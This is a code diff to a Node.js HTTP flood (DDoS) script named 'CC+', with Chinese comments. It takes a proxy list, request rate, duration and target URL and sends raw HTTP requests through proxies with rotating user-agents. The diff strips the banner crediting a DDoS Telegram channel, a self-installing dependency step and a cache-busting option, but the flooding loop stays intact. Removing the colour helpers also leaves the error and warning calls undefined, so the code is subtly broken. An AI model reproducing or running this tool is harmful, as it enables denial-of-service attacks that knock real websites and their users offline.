@@ -10,35 +10,12 @@ const net = require('net')
 const path = require("path")
 const execSync = require('child_process').execSync
 
-// 清屏
-console.log('\033[2J')
-
-// 尝试加载 Chalk，失败则安装
-try {
-    chalk = require('chalk')
-} catch (err) {
-    console.log('\x1B[1m\x1B[33m正在安装安装前置\x1B[39m \x1B[1m\x1B[31mChalk\x1B[39m \x1B[1m\x1B[33m请稍后...\x1B[39m')
-    execSync('npm install chalk')
-    console.log('\x1B[1m\x1B[32m前置\x1B[39m \x1B[1m\x1B[31mChalk\x1B[39m \x1B[1m\x1B[32m安装完成，请重新启动脚本。\x1B[39m')
-    process.exit()
-}
-
-// 颜色
-const cyan = chalk.bold.cyan
-const blue = chalk.bold.blue
-const green = chalk.bold.green
-const error = chalk.bold.red
-const warning = chalk.bold.yellow
-const magenta = chalk.bold.magenta
-console.log(cyan('『CC+』'))
-
 // 检查参数
 if (process.argv.length !== 8) {
     console.log(error('错误：命令格式不正确！'))
-    console.log(warning('SH：./CC+.sh 线程 列表文件 方法 速率 时间(秒) 目标(URL) 随机参数[开:t/关:f]'))
-    console.log(warning('格式：node CC+.js 列表文件 方法 速率 时间(秒) 目标(URL) 随机参数[开:t/关:f]'))
-    console.log(warning('示例：node CC+.js proxy.txt GET 10 60 http://example.com t'))
-    console.log(green('BY：DDoS数据站  &  TG：https://t.me/DDoS_DataStation'))
+    console.log(warning('SH：./CC+.sh 线程 列表文件 方法 速率 时间(秒) 目标(URL) '))
+    console.log(warning('格式：node CC+.js 列表文件 方法 速率 时间(秒) 目标(URL) '))
+    console.log(warning('示例：node CC+.js proxy.txt GET 10 60 http://example.com '))
     process.exit()
 }
 
@@ -49,8 +26,8 @@ const rate = process.argv[4]
 const time = process.argv[5]
 const target = process.argv[6]
 const parsed = url.parse(target)
-const parameter = process.argv[7] === "t"
-//console.log(listFile, methods, rate, time, target, parsed, parameter)
+
+
 
 // 判断参数
 if (!target !== !target.startsWith('http://') && !target.startsWith('https://')) {
@@ -115,13 +92,10 @@ setInterval(function() {
         //console.log('返回：'+data)
     })
 
-    let t = ''
-    if (parameter) {
-        t = '?t=' + Math.round(new Date())
-    }
+
 
     for (let j = 0; j < rate; j++) {
-        socket.write(methods + ' ' + parsed.path + t + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n')
+        socket.write(methods + ' ' + parsed.path  + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n')
     }
     socket.on('data', function() {
         setTimeout(function() {
